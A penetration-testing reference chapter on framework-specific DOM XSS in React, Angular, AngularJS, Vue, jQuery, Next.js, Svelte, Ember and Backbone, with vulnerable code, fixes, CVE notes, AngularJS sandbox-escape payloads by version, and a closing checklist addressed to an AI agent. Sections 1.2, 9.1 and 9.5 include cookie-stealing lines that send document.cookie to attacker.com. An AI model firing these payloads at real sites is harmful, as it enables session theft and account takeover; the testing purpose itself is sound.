# 11 - DOM XSS: Framework-Specific Vectors

## Overview

Modern JavaScript frameworks provide varying levels of automatic XSS protection, but each has specific escape hatches, misuse patterns, and known vulnerabilities that reintroduce DOM XSS. This document catalogs framework-specific attack vectors with version-affected ranges, vulnerable code patterns, exploitation techniques, and ready-to-use payloads.

**References:**
- [The Hacker News - Why React Didn't Kill XSS](https://thehackernews.com/2025/07/why-react-didnt-kill-xss-new-javascript.html)
- [Invicti - Is React Vulnerable to XSS?](https://www.invicti.com/blog/web-security/is-react-vulnerable-to-xss)
- [Angular Security Best Practices](https://angular.dev/best-practices/security)
- [Vue.js Security Guide](https://vuejs.org/guide/best-practices/security)
- [InstaTunnel - Real XSS Dangers in React and Vue SPAs](https://instatunnel.my/blog/beyond-alert1-the-real-world-dangers-of-cross-site-scripting-xss-in-spas)

---

## 1. React XSS Vectors

React escapes all rendered content by default through its virtual DOM, converting special characters to HTML entities. However, several explicit and subtle bypass paths exist.

### 1.1 dangerouslySetInnerHTML

The primary and most common React XSS vector. This prop bypasses React's auto-escaping entirely.

**Affected versions:** All React versions (by design)

**Vulnerable Pattern:**
```jsx
// VULNERABLE: User-controlled HTML rendered directly
function UserProfile({ bio }) {
    return <div dangerouslySetInnerHTML={{ __html: bio }} />;
}

// VULNERABLE: Markdown/rich text rendering without sanitization
function BlogPost({ content }) {
    const htmlContent = markdownToHtml(content); // Converts markdown to HTML
    return <div dangerouslySetInnerHTML={{ __html: htmlContent }} />;
}

// VULNERABLE: API response rendered as HTML
function Notification({ message }) {
    return <div dangerouslySetInnerHTML={{ __html: message }} />;
}
```

**Exploit payloads:**
```
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
```

**Secure alternative:**
```jsx
// SECURE: Use DOMPurify before dangerouslySetInnerHTML
import DOMPurify from 'dompurify';
function SafeContent({ html }) {
    return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;
}
```

**Reference:** [Pragmatic Web Security - React XSS Part 2](https://pragmaticwebsecurity.com/articles/spasecurity/react-xss-part2.html)

### 1.2 href / src with javascript: Protocol

React does NOT block `javascript:` URLs in `href` attributes. Since React 16.9, a warning is logged but execution is not prevented in all cases.

**Affected versions:** All React versions (warning added in 16.9, not blocked)

**Vulnerable Pattern:**
```jsx
// VULNERABLE: User-controlled URL in href
function ExternalLink({ url, label }) {
    return <a href={url}>{label}</a>;
}
// Exploit: url = "javascript:alert(document.domain)"

// VULNERABLE: Dynamic src attribute
function DynamicFrame({ source }) {
    return <iframe src={source} />;
}
// Exploit: source = "javascript:alert(document.domain)"
```

**Reference:** [React Issue #14160 - href not being escaped](https://github.com/facebook/react/issues/14160)

**Exploit payloads:**
```
javascript:alert(document.domain)
javascript:void(document.location='https://attacker.com/?c='+document.cookie)
```

**Secure mitigation:**
```jsx
// SECURE: Validate URL scheme before rendering
function SafeLink({ url, label }) {
    const safeUrl = url.match(/^https?:\/\//) ? url : '#';
    return <a href={safeUrl}>{label}</a>;
}
```

### 1.3 SSR Hydration XSS

When using Server-Side Rendering (SSR) with React (or Next.js), the server generates HTML that the client "hydrates." If the server includes unsanitized user input in the HTML, the client-side React will hydrate it, potentially executing malicious scripts.

**Affected versions:** React 16+ with SSR, Next.js all versions

**Vulnerable Pattern:**
```jsx
// VULNERABLE: Server component renders unsanitized user data
// In Next.js page (server-side)
export async function getServerSideProps(context) {
    const name = context.query.name; // User-controlled
    return { props: { name } };
}

function Page({ name }) {
    // React hydrates the server-rendered HTML containing the name
    return <div dangerouslySetInnerHTML={{ __html: 'Welcome, ' + name }} />;
}
```

**React2Shell (CVE-2025-55182, CVSS 10.0):**
A critical vulnerability in React Server Components (RSC) protocol allowing remote code execution through unsafe deserialization of attacker-controlled data in server-side RSC payload handling. Exploitation only requires a crafted HTTP request.

**CVE-2025-66478:**
Additional vulnerability in the RSC protocol discovered during patch analysis for React2Shell.

**References:**
- [VulnCheck - CVE-2025-55182](https://www.vulncheck.com/blog/cve-2025-55182-react-nextjs)
- [React Blog - Critical Security Vulnerability in RSC](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
- [Next.js - CVE-2025-66478](https://nextjs.org/blog/CVE-2025-66478)

### 1.4 React Native WebView XSS

React Native applications using `WebView` can be vulnerable if they load user-controlled content or URLs.

**Vulnerable Pattern:**
```jsx
// VULNERABLE: User-controlled URL in WebView
import { WebView } from 'react-native-webview';

function BrowserScreen({ url }) {
    return <WebView source={{ uri: url }} />;
}
// Exploit: url = "javascript:alert('XSS')"

// VULNERABLE: Injecting HTML content
function ContentView({ htmlContent }) {
    return <WebView source={{ html: htmlContent }} />;
}
```

### 1.5 Ref-Based DOM Manipulation

Using React refs to directly manipulate the DOM bypasses React's escaping.

**Vulnerable Pattern:**
```jsx
// VULNERABLE: Direct DOM manipulation via ref
function UnsafeComponent({ userContent }) {
    const divRef = useRef(null);

    useEffect(() => {
        // Bypasses React's XSS protection entirely
        divRef.current.innerHTML = userContent;
    }, [userContent]);

    return <div ref={divRef} />;
}
```

---

## 2. Angular XSS Vectors

Angular (2+) provides built-in sanitization via `DomSanitizer`, which automatically sanitizes values in templates. However, explicit bypasses and template injection patterns reintroduce XSS.

### 2.1 bypassSecurityTrust* Methods

Angular's `DomSanitizer` provides methods to explicitly mark values as trusted, bypassing all sanitization.

**Affected versions:** Angular 2+ (all versions)

| Method | What it bypasses |
|--------|-----------------|
| `bypassSecurityTrustHtml(value)` | HTML sanitization |
| `bypassSecurityTrustScript(value)` | Script sanitization |
| `bypassSecurityTrustUrl(value)` | URL sanitization (blocks javascript:) |
| `bypassSecurityTrustResourceUrl(value)` | Resource URL sanitization (iframe src, etc.) |
| `bypassSecurityTrustStyle(value)` | CSS sanitization |

**Vulnerable Patterns:**
```typescript
// VULNERABLE: User input bypasses HTML sanitization
import { DomSanitizer } from '@angular/platform-browser';

@Component({
    template: '<div [innerHTML]="trustedHtml"></div>'
})
export class UnsafeComponent {
    trustedHtml: any;

    constructor(private sanitizer: DomSanitizer, private route: ActivatedRoute) {
        this.route.queryParams.subscribe(params => {
            // CRITICAL: User input marked as trusted
            this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml(params.content);
        });
    }
}

// VULNERABLE: URL bypass allows javascript: protocol
@Component({
    template: '<a [href]="trustedUrl">Click</a>'
})
export class UnsafeLinkComponent {
    trustedUrl: any;

    constructor(private sanitizer: DomSanitizer) {
        // User-controlled URL bypasses javascript: protocol blocking
        this.trustedUrl = sanitizer.bypassSecurityTrustUrl(userInput);
    }
}
```

**Exploit payloads (for bypassSecurityTrustHtml):**
```
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<iframe srcdoc="<script>alert(document.domain)<\/script>">
```

**Reference:** [Angular DomSanitizer Documentation](https://angular.dev/api/platform-browser/DomSanitizer)

### 2.2 Angular Template Injection

If an Angular application compiles templates from user-controlled input (using JIT compilation), template injection leads to XSS.

**Affected versions:** Angular 2+ with JIT compiler enabled

**Vulnerable Pattern:**
```typescript
// VULNERABLE: Dynamic template compilation with user input
import { Compiler, Component, NgModule } from '@angular/core';

@Component({ template: '' })
export class DynamicComponent {
    constructor(private compiler: Compiler) {}

    loadTemplate(userTemplate: string) {
        // CRITICAL: User controls the template
        const tmpComponent = Component({ template: userTemplate })(class {});
        const tmpModule = NgModule({ declarations: [tmpComponent] })(class {});
        this.compiler.compileModuleAndAllComponentsAsync(tmpModule);
    }
}
```

**Never use JIT in production** -- Angular's Ahead-of-Time (AOT) compiler eliminates this vector entirely.

**Reference:** [Angular Security Guide](https://angular.dev/best-practices/security)

### 2.3 AngularJS 1.x Sandbox Escapes (Version-Specific Payloads)

AngularJS (1.x) had an expression sandbox that was bypassed in every version. The sandbox was removed in 1.6.

**Complete version-to-payload mapping:**

| Version Range | Payload |
|---------------|---------|
| 1.0.1 - 1.1.5 | `{{constructor.constructor('alert(1)')()}}` |
| 1.2.0 - 1.2.1 | `{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}` |
| 1.2.2 - 1.2.5 | `{{'a'[{toString:()[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='\"+(y=alert(1))+'")}}` |
| 1.2.6 - 1.2.18 | `{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}` |
| 1.2.19 - 1.2.23 | `{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}` |
| 1.2.24 - 1.2.29 | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}` |
| 1.3.0 - 1.3.9 | `{{x={y:''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}` |
| 1.4.0 - 1.4.9 | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}` |
| 1.5.0 - 1.5.8 | `{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}` |
| 1.5.9 - 1.5.11 | `<div ng-click="$event.path\|orderBy:'alert(1)'">` (DOM-based, requires click) |
| >= 1.6.0 | `{{constructor.constructor('alert(1)')()}}` (no sandbox) |

**References:**
- [PortSwigger - DOM-based AngularJS Sandbox Escapes](https://portswigger.net/research/dom-based-angularjs-sandbox-escapes)
- [Black Duck - AngularJS Sandbox Escape](https://www.blackduck.com/blog/angularjs-sandbox.html)
- [Anvil Secure - AngularJS Sandbox Bypass 1.5.9-1.5.11](https://www.anvilsecure.com/blog/bypass-angularjs-sandbox-dom-based-1-5-9-1-5-11-part-1.html)

### 2.4 Angular Expression Injection via Interpolation

```typescript
// VULNERABLE: Server-side rendering includes user input in Angular template
// If server returns: <div>Hello {{userInput}}</div>
// And userInput is controlled by attacker, expressions execute

// Detection probe:
// Input: {{7*7}}
// If output is "49", expression injection confirmed
```

---

## 3. Vue.js XSS Vectors

Vue.js escapes content in `{{ }}` interpolation by default. XSS vectors rely on explicit unsafe directives or template compilation misuse.

### 3.1 v-html Directive

The `v-html` directive renders raw HTML, equivalent to `innerHTML`.

**Affected versions:** All Vue versions (by design)

**Vulnerable Pattern:**
```html
<!-- VULNERABLE: User-controlled content in v-html -->
<template>
    <div v-html="userContent"></div>
</template>

<script>
export default {
    data() {
        return {
            userContent: this.$route.query.content // From URL parameter
        };
    }
};
</script>
```

**Exploit:**
```
https://target.com/page?content=<img src=x onerror=alert(document.domain)>
```

### 3.2 Template Compilation from User Input

When Vue compiles templates at runtime from user-controlled strings, expression injection occurs.

**Affected versions:** Vue 2.x (full build with compiler), Vue 3 (if runtime compiler included)

**Vulnerable Pattern:**
```javascript
// VULNERABLE: Dynamic template compilation
new Vue({
    el: '#app',
    template: '<div>' + userInput + '</div>' // User controls template source
});

// VULNERABLE: Using Vue.compile with user input
var compiled = Vue.compile('<div>' + userInput + '</div>');
```

**CVE-2024-6783 (Vue 2 Template Compiler XSS via Prototype Pollution):**
The template compiler in Vue 2's "full build" does not sanitize content placed in properties called during render. Via prototype pollution (`Object.prototype.staticClass` or `Object.prototype.staticStyle`), attackers inject arbitrary JavaScript executed during template rendering.

**Affected:** Vue >= 2.0.0 and < 3.0.0

**Reference:** [Snyk - CVE-2024-6783](https://security.snyk.io/vuln/SNYK-JS-VUETEMPLATECOMPILER-7554675)

### 3.3 Vue.js SSR XSS

Server-side rendered Vue applications can introduce XSS if user input is embedded in the HTML before hydration.

**Vulnerable Pattern (Nuxt.js):**
```javascript
// VULNERABLE: asyncData returns unsanitized content used in v-html
export default {
    async asyncData({ query }) {
        return {
            content: query.content // Rendered server-side, then hydrated
        };
    }
};
```

### 3.4 Vue Expression Injection Payloads

```
{{_c.constructor('alert(1)')()}}
{{this.constructor.constructor('alert(1)')()}}
{{this.$el.ownerDocument.defaultView.alert(1)}}
{{typeof alert !== 'undefined' && alert(1)}}
```

---

## 4. jQuery XSS Vectors

jQuery remains extremely prevalent in legacy applications and introduces numerous DOM XSS sinks through its API design.

### 4.1 $() Constructor with User HTML

The jQuery constructor `$()` parses HTML when the input contains `<` characters. In versions before 1.6.3, any string containing `<` was treated as HTML. After 1.6.3, the string must start with `<`, but `$.parseHTML()` still parses arbitrary HTML.

**CVE-2020-11023:** In jQuery versions >= 1.0.3 and < 3.5.0, passing HTML from untrusted sources (even after sanitizing) to one of jQuery's DOM manipulation methods (`.html()`, `.append()`, etc.) may execute untrusted code.

**CVE-2020-7656:** In jQuery versions < 1.9.0, the load method failed to recognize and remove script tags that contain HTML comments, which could enable XSS.

**References:**
- [Snyk - CVE-2020-11023](https://security.snyk.io/vuln/SNYK-JS-JQUERY-565129)
- [TrustedSec - jQuery Vulnerabilities](https://trustedsec.com/blog/everything-you-need-to-know-about-jquery-and-its-vulnerabilities)

**Vulnerable Patterns:**
```javascript
// VULNERABLE: jQuery constructor with location.hash (jQuery < 1.6.3)
$(location.hash);
// Exploit: https://target.com/page#<img src=x onerror=alert(1)>

// VULNERABLE: .html() with unsanitized input
var name = new URLSearchParams(location.search).get('name');
$('#greeting').html('Welcome, ' + name);
// Exploit: ?name=<img src=x onerror=alert(1)>

// VULNERABLE: .append() with user HTML
var comment = getUserComment();
$('#comments').append(comment);
// Exploit: comment = '<svg onload=alert(1)>'

// VULNERABLE: $.parseHTML without context flag
var parsed = $.parseHTML(userInput);
$('#container').append(parsed);
```

### 4.2 jQuery AJAX Response Injection

```javascript
// VULNERABLE: AJAX response rendered as HTML without sanitization
$.get('/api/search?q=' + userQuery, function(response) {
    $('#results').html(response); // Server reflects query unsanitized
});

// VULNERABLE: JSONP callback injection
$.ajax({
    url: 'https://api.example.com/data',
    dataType: 'jsonp',
    jsonpCallback: userControlled // Attacker controls callback name
});
```

### 4.3 jQuery Selector Injection

```javascript
// VULNERABLE: User input used as jQuery selector
var selector = new URLSearchParams(location.search).get('el');
$(selector).addClass('highlight');
// Exploit (jQuery < 3.0): ?el=<img src=x onerror=alert(1)>

// VULNERABLE: jQuery UI autocomplete/dialog with XSS
$('#search').autocomplete({
    source: function(request, response) {
        // If suggestions include HTML and are rendered unsafely
    }
});
```

**CVE-2021-41182 (jQuery UI XSS):** Accepting the value of the `of` option from untrusted sources may execute untrusted code. Fixed in jQuery UI 1.13.0.

**Reference:** [GitHub Security Lab - XSS-unsafe jQuery Plugins](https://securitylab.github.com/ctf/jquery/)

### 4.4 jQuery-Specific Payloads

```
<!-- For $() constructor -->
<img src=x onerror=alert(1)>

<!-- For .html()/.append() -->
<svg onload=alert(document.domain)>
<details open ontoggle=alert(1)>

<!-- For selector injection (jQuery < 3.0) -->
<img/src=x onerror=alert(1)>

<!-- CVE-2020-11023 specific (option element XSS) -->
<option><style></option></select><img src=x onerror=alert(1)>
```

---

## 5. Next.js / Nuxt.js XSS Vectors

### 5.1 Next.js SSR/SSG Hydration Mismatches

When server-rendered HTML contains unsanitized user input and is hydrated by React on the client, XSS can occur.

**CVE-2024-46982 (Next.js Cache Poisoning + XSS):**
A vulnerability in Next.js allows cache poisoning and stored cross-site scripting attacks through crafted requests that manipulate the cache layer.

**Reference:** [CyberSecurity News - Next.js Cache Poisoning XSS](https://cybersecuritynews.com/critical-vulnerability-exposes-websites/)

**Vulnerable Pattern:**
```jsx
// VULNERABLE: getServerSideProps passes raw query to page
export async function getServerSideProps({ query }) {
    return { props: { searchTerm: query.q || '' } };
}

function SearchPage({ searchTerm }) {
    return (
        <div>
            {/* Safe: React escapes this */}
            <h1>Results for: {searchTerm}</h1>

            {/* VULNERABLE: dangerouslySetInnerHTML with server data */}
            <div dangerouslySetInnerHTML={{ __html: 'Results for: ' + searchTerm }} />
        </div>
    );
}
```

### 5.2 Next.js API Route Reflection

```javascript
// VULNERABLE: API route reflects input as HTML
// pages/api/preview.js
export default function handler(req, res) {
    const { content } = req.query;
    res.setHeader('Content-Type', 'text/html');
    res.send('<html><body>' + content + '</body></html>'); // Reflected XSS
}

// Exploit: /api/preview?content=<script>alert(document.domain)<\/script>
```

### 5.3 Nuxt.js Specific Vectors

```javascript
// VULNERABLE: Nuxt asyncData with unsanitized content
export default {
    async asyncData({ $axios, route }) {
        const data = await $axios.$get('/api/page/' + route.params.slug);
        return { pageContent: data.html }; // Used in v-html
    }
};
```

**Reference:** [Deepstrike - Next.js Security Testing Guide](https://deepstrike.io/blog/nextjs-security-testing-bug-bounty-guide)

### 5.4 Next.js Dynamic Import XSS

```javascript
// VULNERABLE: User-influenced dynamic import
const DynamicComponent = dynamic(() => import('../components/' + userInput));
// Could potentially load attacker-controlled modules
```

---

## 6. Svelte XSS Vectors

### 6.1 {@html} Tag

Svelte's `{@html}` tag renders raw HTML, equivalent to `innerHTML`, with no automatic sanitization.

**Affected versions:** All Svelte versions (by design)

**Vulnerable Pattern:**
```svelte
<!-- VULNERABLE: User content rendered as raw HTML -->
<script>
    export let userContent;
</script>

{@html userContent}
```

**CVE-2024-45047 (Svelte XSS via Attribute Escaping):**
Svelte versions prior to 4.2.19 are vulnerable to XSS due to improper escaping of HTML attributes on server-side rendering. Objects with a custom `toString()` method rendered as attribute values result in raw HTML injection.

**CVE-2022-25875 (Svelte XSS):**
Vulnerable Svelte versions allow XSS when objects are rendered directly to attribute values as unescaped strings.

**References:**
- [GitHub Advisory - Svelte CVE-2024-45047](https://github.com/sveltejs/svelte/security/advisories/GHSA-8266-84wp-wv5c)
- [Snyk - Svelte CVE-2022-25875](https://security.snyk.io/vuln/SNYK-JS-SVELTE-2931080)

**Exploit via toString() (CVE-2024-45047):**
```javascript
// Attacker crafts an object with malicious toString
const malicious = {
    toString() {
        return '"><img src=x onerror=alert(1)>';
    }
};
// When Svelte renders: <div class={malicious}>
// Outputs: <div class=""><img src=x onerror=alert(1)>">
```

### 6.2 Svelte-Specific Payloads

```
<!-- For {@html} sink -->
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>

<!-- For attribute injection via toString (CVE-2024-45047) -->
"><img src=x onerror=alert(1)>
" onfocus=alert(1) autofocus="
```

---

## 7. Ember.js XSS Vectors

### 7.1 htmlSafe / SafeString

Ember escapes HTML by default in templates. The `htmlSafe()` function marks strings as trusted, bypassing escaping.

**Affected versions:** All Ember versions (by design)

**Vulnerable Pattern:**
```javascript
// VULNERABLE: User input marked as safe
import { htmlSafe } from '@ember/template';

export default class extends Component {
    get content() {
        // CRITICAL: Never use htmlSafe with user input
        return htmlSafe(this.args.userContent);
    }
}
```

```handlebars
{{! VULNERABLE: Triple-stache renders raw HTML (Ember < 2.0) }}
{{{userContent}}}

{{! Safe: Double-stache escapes HTML }}
{{userContent}}
```

**Ember.js XSS CVEs:**
Ember.js versions 1.8.x through 1.10.x, 1.11.x before 1.11.4, and 1.12.x before 1.12.2 were affected by script injection vulnerabilities.

**Reference:** [GitHub Advisory - Ember.js Script Injection](https://www.miggo.io/vulnerability-database/cve/GHSA-vxp4-25qp-86qh)

---

## 8. Backbone.js XSS Vectors

Backbone.js provides no built-in XSS protection in its templating system. The default Underscore.js templates use `<%= %>` (unescaped) and `<%- %>` (escaped).

### 8.1 Underscore Template Injection

**Vulnerable Pattern:**
```javascript
// VULNERABLE: Unescaped interpolation with user data
var template = _.template('<div><%= userInput %></div>');
$('#content').html(template({ userInput: attackerData }));
// Exploit: attackerData = '<img src=x onerror=alert(1)>'

// SECURE: Use <%- %> for escaped output
var safeTemplate = _.template('<div><%- userInput %></div>');
```

### 8.2 Backbone View render() with innerHTML

```javascript
// VULNERABLE: View renders user HTML directly
var CommentView = Backbone.View.extend({
    render: function() {
        this.el.innerHTML = this.model.get('body'); // Unescaped
        return this;
    }
});
```

---

## 9. Framework-Specific Payloads (Consolidated)

### 9.1 React Payloads

```
<!-- dangerouslySetInnerHTML -->
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>

<!-- href javascript: protocol -->
javascript:alert(document.domain)
javascript:void(document.location='https://attacker.com/?c='+document.cookie)

<!-- SSR injection (in server-rendered HTML context) -->
</script><script>alert(document.domain)<\/script>
```

### 9.2 Angular Payloads

```
<!-- bypassSecurityTrustHtml -->
<img src=x onerror=alert(document.domain)>
<iframe srcdoc="<script>alert(document.domain)<\/script>">

<!-- AngularJS CSTI (>= 1.6, no sandbox) -->
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}

<!-- AngularJS CSTI (1.4.0-1.4.9) -->
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

<!-- AngularJS CSTI (1.2.24-1.2.29) -->
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}

<!-- AngularJS without sandbox (useful on older sites) -->
{{constructor.constructor('alert(1)')()}}
```

### 9.3 Vue.js Payloads

```
<!-- v-html injection -->
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>

<!-- Template expression injection -->
{{_c.constructor('alert(1)')()}}
{{this.constructor.constructor('alert(1)')()}}

<!-- Prototype pollution (CVE-2024-6783) -->
<!-- Pollute: Object.prototype.staticClass = '"><img src=x onerror=alert(1)>' -->
```

### 9.4 jQuery Payloads

```
<!-- $() constructor (jQuery < 3.0) -->
<img src=x onerror=alert(document.domain)>
<img/src=x onerror=alert(document.domain)>

<!-- .html()/.append() injection -->
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>

<!-- CVE-2020-11023 (jQuery < 3.5.0) -->
<option><style></option></select><img src=x onerror=alert(1)>

<!-- Selector injection -->
<img src=x onerror=alert(1)>
```

### 9.5 Next.js / Nuxt.js Payloads

```
<!-- API route reflection -->
<script>alert(document.domain)<\/script>
<img src=x onerror=alert(document.domain)>

<!-- Cache poisoning XSS -->
<script>document.location='https://attacker.com/?c='+document.cookie<\/script>
```

### 9.6 Svelte Payloads

```
<!-- {@html} injection -->
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>

<!-- Attribute injection (CVE-2024-45047, Svelte < 4.2.19) -->
"><img src=x onerror=alert(1)>
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) style="position:fixed;top:0;left:0;width:100%;height:100%
```

### 9.7 Ember.js Payloads

```
<!-- htmlSafe() / triple-stache -->
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```

### 9.8 Backbone.js Payloads

```
<!-- Underscore <%= %> unescaped template -->
<img src=x onerror=alert(document.domain)>
<script>alert(document.domain)<\/script>
```

---

## 10. Framework Detection and Version Identification

### 10.1 Detection Commands (Browser Console)

```javascript
// React
React.version                           // React version
__REACT_DEVTOOLS_GLOBAL_HOOK__          // React DevTools present

// Angular (2+)
document.querySelector('[ng-version]')?.getAttribute('ng-version')
getAllAngularRootElements()              // Angular elements

// AngularJS (1.x)
angular.version.full                    // AngularJS version string

// Vue.js
Vue.version                             // Vue 2
// Vue 3: Check __VUE__ global or Vue DevTools

// jQuery
jQuery.fn.jquery                        // jQuery version
$.fn.jquery                             // Alternate

// Svelte
// Check for __svelte_meta in component elements
document.querySelector('[class*="svelte-"]')  // Svelte component classes

// Next.js
__NEXT_DATA__                           // Next.js data object
document.getElementById('__next')        // Next.js root element

// Nuxt.js
window.__NUXT__                         // Nuxt.js state

// Ember.js
Ember.VERSION                           // Ember version

// Backbone.js
Backbone.VERSION                        // Backbone version
```

### 10.2 Automated Detection

```bash
# Wappalyzer CLI for framework detection
wappalyzer https://target.com

# retire.js for vulnerable library detection
retire --js --outputformat json https://target.com

# Check JavaScript files for framework signatures
curl -s https://target.com | grep -oP '(angular|react|vue|jquery|svelte|ember|backbone)[\w.-]*\.js'
```

---

## 11. Testing Checklist for AI Agent

1. **Identify frameworks:** Run detection commands from Section 10 to determine which frameworks and versions are in use.
2. **React apps:** Search source for `dangerouslySetInnerHTML`, `javascript:` in href/src props, ref-based DOM manipulation.
3. **Angular apps:** Search for `bypassSecurityTrust*` calls and any JIT template compilation with user input.
4. **AngularJS apps:** Determine exact version and test CSTI with `{{7*7}}` probe; use version-specific sandbox escape payload.
5. **Vue.js apps:** Search for `v-html` directives and runtime template compilation with user data.
6. **jQuery apps:** Search for `$()` with user-controlled strings, `.html()` / `.append()` with unsanitized data, and check jQuery version for known CVEs.
7. **Next.js/Nuxt.js apps:** Test API routes for reflection, check for `dangerouslySetInnerHTML` in pages, test cache poisoning vectors.
8. **Svelte apps:** Search for `{@html}` tags with user data, check Svelte version for CVE-2024-45047.
9. **Ember apps:** Search for `htmlSafe()` usage with user input and triple-stache `{{{ }}}` in templates.
10. **Backbone apps:** Check Underscore templates for `<%= %>` (unescaped) interpolation with user-controlled data.
11. **Test each vector** with framework-appropriate payloads from Section 9.
12. **Verify cross-browser** -- test payloads in Chrome, Firefox, and Safari as framework behavior may differ.
